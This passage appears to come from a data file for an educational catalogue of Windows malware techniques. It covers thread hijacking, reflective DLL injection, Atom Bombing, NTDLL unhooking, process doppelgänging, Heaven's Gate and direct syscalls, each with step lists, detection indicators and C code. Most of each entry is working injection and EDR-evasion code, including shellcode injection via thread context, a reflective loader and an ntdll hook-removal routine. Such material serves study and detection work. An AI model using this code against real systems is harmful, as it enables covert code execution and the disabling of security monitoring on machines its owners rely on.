        "difficulty": "Advanced",
        "platform": "Windows",
        "mitre_attack": "T1055.003",
        "tags": ["thread", "SetThreadContext", "GetThreadContext", "hijack"],
        "short_desc": "Suspends a running thread, overwrites its RIP/EIP with shellcode, then resumes it.",
        "description": (
            "Thread hijacking redirects an existing thread in the target process without creating new "
            "threads. The attacker suspends a thread, reads its current CPU context (registers), saves "
            "the original instruction pointer, overwrites RIP/EIP to point at shellcode, then resumes.\n\n"
            "When the thread resumes, it executes the attacker's code. The shellcode must eventually "
            "restore the original context and jump back to the legitimate continuation address to avoid "
            "crashing the process — a technique called context restoration or return-oriented stubs.\n\n"
            "This is more complex than DLL injection but avoids creating new threads, making it harder "
            "to detect via thread enumeration. A common pitfall: hijacking a thread that is waiting in "
            "a kernel call (SuspendThread returns but the thread is still in the kernel) can cause "
            "instability if the shellcode doesn't properly handle the stack frame."
        ),
        "how_it_works": [
            "OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid) and enumerate threads with CreateToolhelp32Snapshot.",
            "Select a suitable thread (one NOT in a critical section or blocking syscall).",
            "OpenThread(THREAD_ALL_ACCESS, FALSE, tid) and SuspendThread(hThread).",
            "GetThreadContext(hThread, &ctx) to capture the full register state.",
            "Save ctx.Rip (the original return address to restore later).",
            "VirtualAllocEx + WriteProcessMemory to plant shellcode + a small restore stub.",
            "Patch ctx.Rip to point at the shellcode start address.",
            "SetThreadContext(hThread, &ctx) to commit the modified context.",
            "ResumeThread — the hijacked thread now runs shellcode.",
            "Shellcode eventually restores original registers and jumps back to the saved Rip.",
        ],
        "code_example": r"""#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

// Find first thread of a process (skip thread 0 — often critical)
DWORD GetFirstThread(DWORD pid) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te = { .dwSize = sizeof(te) };
    DWORD tid = 0;

    for (BOOL ok = Thread32First(snap, &te); ok; ok = Thread32Next(snap, &te)) {
        if (te.th32OwnerProcessID == pid) { tid = te.th32ThreadID; break; }
    }
    CloseHandle(snap);
    return tid;
}

BOOL HijackThread(DWORD pid, PBYTE sc, SIZE_T scLen) {
    DWORD tid = GetFirstThread(pid);
    if (!tid) return FALSE;

    HANDLE hProc   = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, tid);

    // 1. Allocate + write shellcode in target
    LPVOID remote = VirtualAllocEx(hProc, NULL, scLen,
                                    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProc, remote, sc, scLen, NULL);

    // 2. Suspend and read context
    SuspendThread(hThread);
    CONTEXT ctx = { .ContextFlags = CONTEXT_FULL };
    GetThreadContext(hThread, &ctx);

    printf("[*] Original RIP = 0x%llX\n", ctx.Rip);

    // 3. Redirect execution to shellcode
    ctx.Rip = (ULONGLONG)remote;
    SetThreadContext(hThread, &ctx);

    printf("[+] RIP patched → %p. Resuming thread %lu.\n", remote, tid);
    ResumeThread(hThread);

    // NOTE: real shellcode must restore ctx and jmp back to original RIP
    CloseHandle(hThread);
    CloseHandle(hProc);
    return TRUE;
}
""",
        "code_language": "c",
        "detection": [
            "SuspendThread + SetThreadContext from an external process is a strong hijacking indicator.",
            "Thread's Rip/Eip pointing into anonymous (non-image-backed) memory after a resume.",
            "GetThreadContext / SetThreadContext cross-process calls logged via ETW or EDR API hooks.",
            "Unexpected context switches: a thread that was idle suddenly executing in a foreign region.",
            "Behavioral: process crashes or instability caused by partial hijack attempts.",
        ],
        "has_simulation": True,
        "sim_description": (
            "Animated walkthrough showing the thread context before and after modification, "
            "highlighting the RIP register change and the execution flow redirection."
        ),
    },

    # ─────────────────────────────────────────────────────────────────────────
    # ADVANCED EVASION
    # ─────────────────────────────────────────────────────────────────────────
    {
        "id": "reflective_dll",
        "name": "Reflective DLL Injection",
        "category": "Advanced Evasion",
        "difficulty": "Expert",
        "platform": "Windows",
        "mitre_attack": "T1055.001",
        "tags": ["reflective", "DLL", "in-memory", "PIC", "loader"],
        "short_desc": "Loads a DLL entirely from memory, bypassing the Windows loader and leaving no on-disk artefact.",
        "description": (
            "Reflective DLL Injection, introduced by Stephen Fewer in 2008, enables a DLL to load "
            "itself into memory without calling the Windows loader (LoadLibrary). The DLL contains a "
            "custom bootstrapping function (ReflectiveLoader) that acts as a miniature loader: it "
            "parses its own PE header, maps sections, resolves imports, applies relocations, and calls "
            "DllMain — all from within the injected payload.\n\n"
            "Because the Windows loader is never involved, the DLL never appears in the PEB module "
            "list, there is no file on disk to scan, and the module is invisible to EnumProcessModules. "
            "This makes it the gold standard for in-memory implants and is the foundation of Cobalt "
            "Strike's Beacon, meterpreter, and countless other post-exploitation frameworks.\n\n"
            "The injector only needs to: copy the DLL bytes into the remote process and call "
            "CreateRemoteThread at the ReflectiveLoader export — which is at a known offset."
        ),
        "how_it_works": [
            "The payload DLL exports a ReflectiveLoader function as the first step of self-bootstrap.",
            "Injector copies the raw DLL bytes into the target process (VirtualAllocEx + WriteProcessMemory).",
            "CreateRemoteThread starts at the offset of ReflectiveLoader within the blob.",
            "ReflectiveLoader walks the PEB.Ldr to find kernel32.dll and ntdll.dll without using the import table.",
            "Uses hash-based API resolution to locate VirtualAlloc, LoadLibraryA, GetProcAddress.",
            "Allocates a new memory region sized for the DLL's full virtual image.",
            "Copies PE headers and all sections to the new region.",
            "Processes the import directory: loads required DLLs and resolves function addresses.",
            "Applies base relocations if the allocated base differs from the preferred base.",
            "Calls DllMain(DLL_PROCESS_ATTACH) to run the actual payload.",
        ],
        "code_example": r"""// ReflectiveLoader bootstrap — runs entirely in the remote process
// (Simplified; full impl at: github.com/stephenfewer/ReflectiveDLLInjection)
#include <windows.h>
#include "ReflectiveLoader.h"

// This function must be the first export (or at a fixed offset)
DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader(LPVOID lpParameter) {

    // ── Step 1: find our own base by scanning backwards for the MZ header ──
    ULONG_PTR uiLibraryAddress = (ULONG_PTR)ReflectiveLoader;
    while (*(WORD *)uiLibraryAddress != IMAGE_DOS_SIGNATURE) uiLibraryAddress--;

    // ── Step 2: walk PEB.Ldr to find kernel32.dll (hash-based, no IAT) ─────
    ULONG_PTR kernel32Base = GetK32Base();   // internal PEB walk
    PFN_LoadLibraryA     pLoadLibA = (PFN_LoadLibraryA)
                            HashGetProcAddress(kernel32Base, HASH_LOADLIBRARYA);
    PFN_GetProcAddress   pGetProc  = (PFN_GetProcAddress)
                            HashGetProcAddress(kernel32Base, HASH_GETPROCADDRESS);
    PFN_VirtualAlloc     pVirtAlloc = (PFN_VirtualAlloc)
                            HashGetProcAddress(kernel32Base, HASH_VIRTUALALLOC);

    // ── Step 3: parse our PE and allocate a new virtual image ──────────────
    PIMAGE_NT_HEADERS nt   = NtHdrs(uiLibraryAddress);
    ULONG_PTR newBase      = (ULONG_PTR)pVirtAlloc(
                                (LPVOID)nt->OptionalHeader.ImageBase,
                                nt->OptionalHeader.SizeOfImage,
                                MEM_RESERVE | MEM_COMMIT,
                                PAGE_EXECUTE_READWRITE);

    // ── Step 4: copy headers + sections ─────────────────────────────────────
    memcpy((void *)newBase, (void *)uiLibraryAddress, nt->OptionalHeader.SizeOfHeaders);
    PIMAGE_SECTION_HEADER sec = FirstSection(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++)
        memcpy((BYTE *)newBase + sec->VirtualAddress,
               (BYTE *)uiLibraryAddress + sec->PointerToRawData,
               sec->SizeOfRawData);

    // ── Step 5: process imports ──────────────────────────────────────────────
    ProcessImports(newBase, nt, pLoadLibA, pGetProc);

    // ── Step 6: apply base relocations ──────────────────────────────────────
    LONGLONG delta = (LONGLONG)newBase - (LONGLONG)nt->OptionalHeader.ImageBase;
    if (delta) ApplyRelocations(newBase, nt, delta);

    // ── Step 7: call DllMain ─────────────────────────────────────────────────
    DLL_MAIN pDllMain = (DLL_MAIN)(newBase + nt->OptionalHeader.AddressOfEntryPoint);
    pDllMain((HINSTANCE)newBase, DLL_PROCESS_ATTACH, NULL);

    return newBase;
}
""",
        "code_language": "c",
        "detection": [
            "Memory region that contains a PE image (MZ/PE header) but is NOT tracked by the loader — pe-sieve detects this.",
            "Executable private memory (anonymous, not file-backed) containing structured PE data.",
            "Thread start address within an anonymous executable region — CreateRemoteThread to raw bytes.",
            "No DLL entry in PEB.Ldr despite PE headers present in process memory.",
            "Cobalt Strike / meterpreter signatures for specific ReflectiveLoader hash constants (0x6A4ABC5B etc.).",
            "Behavioral: process performs complex self-mapping behavior before calling exported functions.",
        ],
        "has_simulation": True,
        "sim_description": (
            "Step-by-step walkthrough of the ReflectiveLoader bootstrap process: "
            "PEB walk, hash resolution, section mapping, import resolution, and DllMain call."
        ),
    },

    {
        "id": "atom_bombing",
        "name": "Atom Bombing",
        "category": "Advanced Evasion",
        "difficulty": "Expert",
        "platform": "Windows",
        "mitre_attack": "T1055",
        "tags": ["atom", "GlobalAddAtom", "NtQueueApcThread", "evasion"],
        "short_desc": "Stores shellcode in the global atom table, then uses APC to copy and execute it in a target process.",
        "description": (
            "Atom Bombing (discovered by enSilo in 2016) is a code injection technique that exploits the "
            "Windows global atom table — a shared key-value store where any process can add/read entries. "
            "By storing shellcode in atom table entries, the attacker bypasses write-to-foreign-process "
            "APIs (no VirtualAllocEx, no WriteProcessMemory) that many security products monitor.\n\n"
            "The payload is fragmented across multiple atom table entries (each limited to 255 bytes). "
            "An APC is then queued to a thread in the target process to call GlobalGetAtomNameW — which "
            "will copy the atom data INTO the target process's memory. Another APC triggers execution.\n\n"
            "The technique avoids the classic VirtualAllocEx + WriteProcessMemory + CreateRemoteThread "
            "tripwire that most AV/EDR products trigger on. However, modern EDRs now also monitor "
            "NtQueueApcThread and atom table abuse patterns."
        ),
        "how_it_works": [
            "Fragment shellcode into 255-byte chunks (the atom table entry size limit).",
            "Call GlobalAddAtomW() for each chunk to store shellcode in the global atom table.",
            "Find an alertable thread in the target process (e.g., in a thread pool or via ntdll wait).",
            "Queue an APC to the target thread via NtQueueApcThread targeting GlobalGetAtomNameW.",
            "GlobalGetAtomNameW copies the atom data from the table into a target-process buffer.",
            "Reassemble the full shellcode in the target's memory using further APC calls.",
            "Queue a final APC to call SetThreadContext or a stub that pivots to the reassembled shellcode.",
            "When the target thread's alertable wait fires, all APCs drain in sequence executing the payload.",
        ],
        "code_example": r"""// Atom Bombing — store shellcode in atom table, copy to target via APC
// Reference: enSilo blog — "AtomBombing: A Brand New Code Injection for Windows"
#include <windows.h>
#include <winternl.h>
#include <stdio.h>

#define ATOM_CHUNK 255

typedef NTSTATUS(NTAPI *PFN_NtQueueApcThread)(HANDLE, PIO_APC_ROUTINE, PVOID, PVOID, PVOID);

// Store shellcode chunks in global atom table
BOOL StorePayloadInAtoms(PBYTE sc, SIZE_T scLen, ATOM *atoms, int *count) {
    *count = 0;
    for (SIZE_T i = 0; i < scLen; i += ATOM_CHUNK) {
        SIZE_T chunk = min((SIZE_T)ATOM_CHUNK, scLen - i);
        wchar_t buf[ATOM_CHUNK + 1];

        // Convert chunk bytes to wide chars (simple encoding)
        for (SIZE_T j = 0; j < chunk; j++) buf[j] = (wchar_t)sc[i + j];
        buf[chunk] = L'\0';

        atoms[*count] = GlobalAddAtomW(buf);
        if (!atoms[*count]) return FALSE;
        (*count)++;
    }
    return TRUE;
}

// Queue APC that calls GlobalGetAtomNameW to copy chunk into target process
BOOL QueueAtomCopyAPC(HANDLE hThread, ATOM atom, LPVOID dest, DWORD bufLen) {
    PFN_NtQueueApcThread NtQueueApc =
        (PFN_NtQueueApcThread)GetProcAddress(GetModuleHandleA("ntdll.dll"),
                                              "NtQueueApcThread");

    PVOID pGetAtomName = GetProcAddress(GetModuleHandleA("kernel32.dll"),
                                         "GlobalGetAtomNameW");

    // NtQueueApcThread(thread, routine, atom, dest, bufLen)
    NTSTATUS status = NtQueueApc(hThread,
                                  (PIO_APC_ROUTINE)pGetAtomName,
                                  (PVOID)(ULONG_PTR)atom,
                                  dest,
                                  (PVOID)(ULONG_PTR)bufLen);
    return NT_SUCCESS(status);
}

// Full Atom Bomb injection
BOOL AtomBomb(DWORD pid, PBYTE sc, SIZE_T scLen) {
    ATOM atoms[64];
    int  nAtoms = 0;

    // Step 1: store payload in atom table
    if (!StorePayloadInAtoms(sc, scLen, atoms, &nAtoms)) return FALSE;
    printf("[+] Stored %d atoms in global table\n", nAtoms);

    // Step 2: find alertable thread in target, allocate RWX buffer
    HANDLE hProc   = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    LPVOID remote  = VirtualAllocEx(hProc, NULL, scLen,
                                     MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // Step 3: queue APCs to reassemble shellcode in target process
    HANDLE hThread = /* find alertable thread via CreateToolhelp32Snapshot */ NULL;
    BYTE *dest     = (BYTE *)remote;

    for (int i = 0; i < nAtoms; i++) {
        QueueAtomCopyAPC(hThread, atoms[i], dest, ATOM_CHUNK * 2);
        dest += ATOM_CHUNK;
    }

    // Step 4: cleanup atoms from table
    for (int i = 0; i < nAtoms; i++) GlobalDeleteAtom(atoms[i]);

    printf("[+] All APCs queued. Shellcode will assemble on next alertable wait.\n");
    CloseHandle(hProc);
    return TRUE;
}
""",
        "code_language": "c",
        "detection": [
            "Rapid GlobalAddAtomW calls storing binary-looking data (non-printable chars) in atom names.",
            "NtQueueApcThread with GlobalGetAtomNameW as the APC routine is a known Atom Bombing signature.",
            "Cross-process NtQueueApcThread calls not associated with a debugger or legitimate automation.",
            "Anomalous RWX pages appearing in process memory without corresponding VirtualAllocEx from a parent.",
            "Atom table size anomaly: a high count of atoms with random-looking names.",
        ],
        "has_simulation": True,
        "sim_description": (
            "Step-by-step visualization: watch chunks get stored in the atom table, "
            "then see them being reassembled in a simulated target memory buffer."
        ),
    },

    {
        "id": "ntdll_unhooking",
        "name": "NTDLL Unhooking",
        "category": "Advanced Evasion",
        "difficulty": "Expert",
        "platform": "Windows",
        "mitre_attack": "T1562.001",
        "tags": ["unhook", "ntdll", "EDR bypass", "syscall", "patch"],
        "short_desc": "Restores ntdll.dll's original bytes from disk to remove EDR user-mode hooks before executing payloads.",
        "description": (
            "EDR and AV products insert inline hooks (5-byte JMP patches) at the start of critical "
            "NTDLL syscall stubs (NtAllocateVirtualMemory, NtWriteVirtualMemory, etc.) to intercept "
            "and inspect all system calls. NTDLL unhooking removes these hooks by re-reading the "
            "clean ntdll.dll from disk and overwriting the patched bytes with the original code.\n\n"
            "Once unhooked, all subsequent NTDLL calls bypass the EDR's user-mode monitoring layer "
            "entirely. The attacker then has free rein to perform injection, process hollowing, or "
            "other operations without triggering EDR callbacks.\n\n"
            "Variants include: reading the clean copy from disk, mapping a fresh copy from the KnownDLLs "
            "object directory, using direct syscalls (bypassing ntdll entirely), or using hardware "
            "breakpoint-based unhooking that avoids touching ntdll memory at all."
        ),
        "how_it_works": [
            "Read ntdll.dll from disk into a local buffer (CreateFileA + ReadFile on C:\\Windows\\System32\\ntdll.dll).",
            "Alternatively, map from \\KnownDlls\\ntdll.dll via NtOpenSection + NtMapViewOfSection.",
            "Parse the on-disk PE to locate the .text section (where syscall stubs live).",
            "Get the base address of the in-memory ntdll.dll via GetModuleHandle(\"ntdll.dll\").",
            "Use VirtualProtect to make the in-memory .text section writable.",
            "memcpy the clean .text bytes from the disk copy over the hooked in-memory copy.",
            "Restore VirtualProtect to PAGE_EXECUTE_READ.",
            "All subsequent NTDLL calls now use the unpatched stubs — EDR hooks are gone.",
        ],
        "code_example": r"""#include <windows.h>
#include <stdio.h>

BOOL UnhookNTDLL(void) {
    const char *path = "C:\\Windows\\System32\\ntdll.dll";

    // 1. Open and read clean ntdll from disk
    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ,
                                NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    DWORD fileSize = GetFileSize(hFile, NULL);
    PBYTE diskCopy = (PBYTE)VirtualAlloc(NULL, fileSize,
                                          MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    DWORD bytesRead;
    ReadFile(hFile, diskCopy, fileSize, &bytesRead, NULL);
    CloseHandle(hFile);
    printf("[+] Read %lu bytes from disk ntdll\n", bytesRead);

    // 2. Parse disk copy to find .text section
    PIMAGE_DOS_HEADER dos  = (PIMAGE_DOS_HEADER)diskCopy;
    PIMAGE_NT_HEADERS nt   = (PIMAGE_NT_HEADERS)(diskCopy + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    DWORD textVA   = 0;
    DWORD textRaw  = 0;
    DWORD textSize = 0;

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (memcmp(sec->Name, ".text", 5) == 0) {
            textVA   = sec->VirtualAddress;
            textRaw  = sec->PointerToRawData;
            textSize = sec->SizeOfRawData;
            break;
        }
    }
    printf("[+] .text: VA=0x%08X  RawOff=0x%08X  Size=0x%08X\n",
           textVA, textRaw, textSize);

    // 3. Get in-memory ntdll base
    HMODULE hNtdll    = GetModuleHandleA("ntdll.dll");
    PBYTE   memText   = (PBYTE)hNtdll + textVA;
    PBYTE   diskText  = diskCopy + textRaw;

    // 4. Make .text writable and overwrite with clean bytes
    DWORD oldProt;
    if (!VirtualProtect(memText, textSize, PAGE_EXECUTE_READWRITE, &oldProt)) {
        printf("[-] VirtualProtect failed: %lu\n", GetLastError());
        VirtualFree(diskCopy, 0, MEM_RELEASE);
        return FALSE;
    }

    memcpy(memText, diskText, textSize);
    VirtualProtect(memText, textSize, oldProt, &oldProt);

    printf("[*] ntdll .text section restored — EDR hooks removed.\n");

    VirtualFree(diskCopy, 0, MEM_RELEASE);
    return TRUE;
}

int main(void) {
    return UnhookNTDLL() ? 0 : 1;
}
""",
        "code_language": "c",
        "detection": [
            "VirtualProtect on ntdll.dll .text section to PAGE_EXECUTE_READWRITE is a near-certain indicator.",
            "Large WriteProcessMemory (or memcpy) into ntdll.dll's address range from the same process.",
            "Kernel-level integrity checks (PatchGuard on drivers, not user-mode) can detect .text modifications.",
            "Some EDRs protect their hooks with guard pages or CRC checks and alert on modification attempts.",
            "Monitor CreateFile opens of ntdll.dll from non-loader processes — reading ntdll from disk is unusual.",
            "ETW stack traces: calls to ReadFile that land in ntdll address space logic paths.",
        ],
        "has_simulation": True,
        "sim_description": (
            "Shows a mock hooked function with the JMP patch bytes, then demonstrates "
            "the restoration process by replacing them with the original syscall stub bytes."
        ),
    },

    # ─────────────────────────────────────────────────────────────────────────
    # PROCESS INJECTION (continued)
    # ─────────────────────────────────────────────────────────────────────────
    {
        "id": "process_doppelganging",
        "name": "Process Doppelgänging",
        "category": "Process Injection",
        "difficulty": "Expert",
        "platform": "Windows",
        "mitre_attack": "T1055.013",
        "tags": ["doppelganging", "TxF", "NTFS transaction", "NtCreateProcessEx", "fileless"],
        "short_desc": "Uses Windows Transactional NTFS to load a malicious PE that never touches the real filesystem.",
        "description": (
            "Process Doppelgänging, introduced by enSilo at Black Hat Europe 2017, abuses the Windows "
            "Transactional NTFS (TxF) API to create a process from a PE that is written within a "
            "transaction that is immediately rolled back. The malicious file is never committed to disk "
            "— it exists only within the kernel's transaction manager memory.\n\n"
            "The key insight: NtCreateSection(SEC_IMAGE) on a transacted file handle creates an image "
            "section from the transacted (in-memory) version of the file. Even after the transaction is "
            "rolled back and the on-disk file reverts to its original state, the image section — and any "
            "process created from it — continues to use the transacted (malicious) content.\n\n"
            "From Windows' perspective, the process image path points to a legitimate file. Forensic "
            "analysis of the disk shows only the original file. This makes it extremely difficult for "
            "file-based scanners to detect the malicious content."
        ),
        "how_it_works": [
            "CreateTransaction() — opens a new NTFS kernel transaction object.",
            "CreateFileTransactedA(hostPath, ..., hTransaction) — opens a legitimate executable (e.g. svchost.exe) within the transaction.",
            "WriteFile(hTransactedFile, maliciousPE, peSize) — overwrites the file contents within the transaction only.",
            "NtCreateSection(SEC_IMAGE, hTransactedFile) — creates a memory-mapped image section from the transacted file.",
            "RollbackTransaction(hTransaction) — reverts the on-disk file to its original content. The section still holds the malicious image.",
            "NtCreateProcessEx(hSection) — creates a new process backed by the malicious section.",
            "NtCreateThreadEx at the PE entry point to start execution.",
            "The process runs malicious code but reports a legitimate image path in Task Manager and PEB.",
        ],
        "code_example": r"""#include <windows.h>
#include <winternl.h>
#include <stdio.h>

// TxF and NT API typedefs
typedef HANDLE (WINAPI *PFN_CreateTransaction)(LPSECURITY_ATTRIBUTES, LPGUID, DWORD, DWORD, DWORD, DWORD, LPWSTR);
typedef BOOL   (WINAPI *PFN_RollbackTransaction)(HANDLE);
typedef NTSTATUS (NTAPI *PFN_NtCreateSection)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
typedef NTSTATUS (NTAPI *PFN_NtCreateProcessEx)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, ULONG, HANDLE, HANDLE, HANDLE, BOOLEAN);

BOOL DoppelGang(const wchar_t *hostPath, PBYTE payload, SIZE_T payloadSize) {
    // Load TxF functions dynamically
    HMODULE hKtmW32  = LoadLibraryA("KtmW32.dll");
    HMODULE hNtdll   = GetModuleHandleA("ntdll.dll");

    PFN_CreateTransaction    pCreateTx    = (PFN_CreateTransaction)GetProcAddress(hKtmW32, "CreateTransaction");
    PFN_RollbackTransaction  pRollback    = (PFN_RollbackTransaction)GetProcAddress(hKtmW32, "RollbackTransaction");
    PFN_NtCreateSection      pNtCreateSec = (PFN_NtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    PFN_NtCreateProcessEx    pNtCreatePro = (PFN_NtCreateProcessEx)GetProcAddress(hNtdll, "NtCreateProcessEx");

    // 1. Open a new NTFS transaction
    HANDLE hTx = pCreateTx(NULL, NULL, 0, 0, 0, 0, NULL);
    printf("[+] Transaction handle: %p\n", hTx);

    // 2. Open host file within the transaction
    HANDLE hFile = CreateFileTransactedW(
        hostPath, GENERIC_WRITE | GENERIC_READ,
        0, NULL, OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL, NULL,
        hTx, NULL, NULL);
    printf("[+] Transacted file: %p\n", hFile);

    // 3. Overwrite with malicious PE (visible only within transaction)
    DWORD written;
    WriteFile(hFile, payload, (DWORD)payloadSize, &written, NULL);
    printf("[+] Wrote %lu bytes to transacted file\n", written);

    // 4. Create image section from transacted file
    HANDLE hSection = NULL;
    NTSTATUS status = pNtCreateSec(
        &hSection,
        SECTION_ALL_ACCESS,
        NULL, NULL,
        PAGE_READONLY,
        SEC_IMAGE,    // map as executable image
        hFile);
    printf("[+] Section: %p  (NTSTATUS=0x%08X)\n", hSection, status);
    CloseHandle(hFile);

    // 5. Roll back — disk file reverts to original; section keeps malicious image
    pRollback(hTx);
    CloseHandle(hTx);
    printf("[*] Transaction rolled back — disk is clean\n");

    // 6. Create process from the (now-malicious) section
    HANDLE hProc = NULL;
    pNtCreatePro(&hProc, PROCESS_ALL_ACCESS, NULL,
                  GetCurrentProcess(), 0,
                  hSection, NULL, NULL, FALSE);
    printf("[+] Process created: %p\n", hProc);

    // 7. Create main thread at PE entry point (omitted for brevity — same as hollowing)
    // NtCreateThreadEx, set up PEB, etc.

    CloseHandle(hSection);
    return TRUE;
}
""",
        "code_language": "c",
        "detection": [
            "CreateFileTransactedW + WriteFile + NtCreateSection(SEC_IMAGE) + RollbackTransaction sequence.",
            "NtCreateProcessEx called with a section not backed by any visible on-disk file.",
            "Process image path pointing to a legitimate file whose content hash doesn't match the running code.",
            "Memory forensics: scan mapped sections for PE images whose on-disk hash differs from the running image.",
            "Windows 10 1803+ partially mitigates by blocking transacted section-image creation (KB4093119).",
            "ETW: kernel transaction events combined with process-create events from non-standard callers.",
        ],
        "has_simulation": True,
        "sim_description": (
            "Step-by-step walkthrough: transaction lifecycle, transacted write, section creation, "
            "rollback, and process creation — with a side-by-side showing what's on disk vs. in memory."
        ),
    },

    # ─────────────────────────────────────────────────────────────────────────
    # ADVANCED EVASION (continued)
    # ─────────────────────────────────────────────────────────────────────────
    {
        "id": "heavens_gate",
        "name": "Heaven's Gate (WOW64 Escape)",
        "category": "Advanced Evasion",
        "difficulty": "Expert",
        "platform": "Windows",
        "mitre_attack": "T1055.012",
        "tags": ["Heaven's Gate", "WOW64", "64-bit", "segment selector", "far jmp", "hook bypass"],
        "short_desc": "A 32-bit process jumps to 64-bit execution mode to bypass 32-bit user-mode hooks.",
        "description": (
            "On 64-bit Windows, 32-bit processes run under WOW64 (Windows-on-Windows 64). EDRs hook "
            "the 32-bit ntdll.dll to monitor API calls from 32-bit code. Heaven's Gate exploits a "
            "fundamental CPU feature: on x64 processors, code can switch between 32-bit (compatibility) "
            "and 64-bit (long) mode using a far JMP with a specific segment selector.\n\n"
            "Segment selector 0x23 = 32-bit compatibility mode. Selector 0x33 = 64-bit long mode. "
            "A 32-bit process can execute a far JMP to CS:0x33 to transition to 64-bit mode, directly "
            "call 64-bit NTDLL syscall stubs (which are NOT hooked by 32-bit EDR hooks), then jump back "
            "to 0x23 to return to 32-bit mode.\n\n"
            "This completely bypasses all 32-bit user-mode hooks because the call never passes through "
            "the hooked 32-bit ntdll. The 64-bit ntdll stubs are unhooked from the perspective of the "
            "32-bit EDR component."
        ),
        "how_it_works": [
            "Confirm you're in a WOW64 process: IsWow64Process() returns TRUE.",
            "Locate the 64-bit NTDLL base: read the 64-bit TEB at FS:[0xC0] (WOW64 stores it there), walk PEB64.Ldr.",
            "Find the target syscall function (e.g. NtAllocateVirtualMemory) in the 64-bit NTDLL export table.",
            "Extract the Syscall Service Number (SSN) from the stub's MOV EAX, <ssn> instruction.",
            "Prepare arguments in 64-bit calling convention: RCX, RDX, R8, R9, then stack.",
            "In inline assembly: push the 64-bit return address, then execute a far JMP with selector 0x33.",
            "CPU switches to 64-bit mode — now execute the syscall instruction with the SSN in EAX.",
            "Far JMP back to selector 0x23 to return to 32-bit mode.",
            "The kernel handled the syscall directly — 32-bit hooks were never invoked.",
        ],
        "code_example": r"""// Heaven's Gate — 32-bit code calling a 64-bit syscall
// Compile as 32-bit (x86) on a 64-bit Windows system

#include <windows.h>
#include <stdio.h>

// The 64-bit syscall stub we'll execute directly
// NtAllocateVirtualMemory SSN on Windows 10 21H2 = 0x18
#define NT_ALLOC_SSN  0x18

// Far pointer structure for the jmp
#pragma pack(push, 1)
typedef struct { DWORD offset; WORD selector; } FAR_JMP_PTR;
#pragma pack(pop)

// Switch to 64-bit mode and execute syscall
__declspec(naked) NTSTATUS NTAPI X64Syscall(
    DWORD ssn,        // syscall number
    DWORD argCount,   // number of arguments
    ...               // arguments
) {
    __asm {
        // Save registers
        push ebp
        mov  ebp, esp
        push edi
        push esi
        push ebx

        // Build the far JMP descriptor (Heaven's Gate)
        call next
    next:
        pop  esi
        lea  edi, [esi + (gate64 - next)]   ; 64-bit code address
        mov  word  ptr [esi + 5], 0x33      ; selector = 0x33 (64-bit)

        // Prepare arguments for 64-bit calling convention
        // (simplified — real impl marshals args onto 64-bit stack)
        mov  eax, [ebp + 8]   ; SSN

        // Far JMP to 64-bit mode
        jmp  fword ptr [edi]

    gate64:
        // ── NOW IN 64-BIT MODE ────────────────────────────────────────
        // (assembler won't encode these natively in MASM 32-bit mode
        //  — in practice use raw byte sequences)
        // mov r10, rcx
        DB 0x4C, 0x8B, 0xD1       ; mov r10, rcx
        DB 0x0F, 0x05              ; syscall
        // Return via far jmp back to 0x23
        DB 0xCB                    ; retf  (returns to 32-bit mode)

        // ── BACK IN 32-BIT MODE ────────────────────────────────────────
        pop  ebx
        pop  esi
        pop  edi
        pop  ebp
        ret  8
    }
}

int main(void) {
    PVOID base = NULL;
    SIZE_T size = 0x1000;

    // Call NtAllocateVirtualMemory directly through Heaven's Gate
    NTSTATUS st = X64Syscall(
        NT_ALLOC_SSN, 6,
        GetCurrentProcess(), &base, 0, &size,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
    );

    printf("[+] X64Syscall → NTSTATUS=0x%08X  base=%p\n", st, base);
    return 0;
}
""",
        "code_language": "c",
        "detection": [
            "Far JMP instructions with selector 0x33 in 32-bit process code are a direct Heaven's Gate signature.",
            "Execution of 64-bit code (detected by segment change) within a WOW64 process outside of wow64.dll.",
            "Syscall events arriving from a 32-bit process address range — kernel can detect the calling context.",
            "64-bit EDR components can monitor syscall counts and patterns from WOW64 processes.",
            "Binary signatures: byte patterns 0x33 (selector), 0x0F 0x05 (syscall) in 32-bit PE sections.",
        ],
        "has_simulation": True,
        "sim_description": (
            "Animated walkthrough: WOW64 process layout, 32-bit hook chain, far JMP to 0x33, "
            "64-bit syscall execution, and return — showing why 32-bit hooks are completely bypassed."
        ),
    },

    {
        "id": "direct_syscalls",
        "name": "Direct Syscalls / Hell's Gate",
        "category": "Advanced Evasion",
        "difficulty": "Expert",
        "platform": "Windows",
        "mitre_attack": "T1562.001",
        "tags": ["syscall", "SSN", "Hell's Gate", "SysWhispers", "direct syscall", "EDR bypass"],
        "short_desc": "Invokes Windows kernel functions directly via the syscall instruction, bypassing all NTDLL user-mode hooks.",
        "description": (
            "EDR hooks live in ntdll.dll's user-mode stubs. Direct syscalls skip ntdll entirely: "
            "the attacker manually replicates the 2–4 instruction syscall stub (mov r10,rcx / mov eax,SSN / syscall) "
            "in their own code, calling the kernel directly.\n\n"
            "The critical challenge is knowing the Syscall Service Number (SSN) — an integer that "
            "maps to each kernel function. SSNs change between Windows versions and patch levels. "
            "Tools like SysWhispers2/3 solve this at compile time by embedding version-specific SSN tables.\n\n"
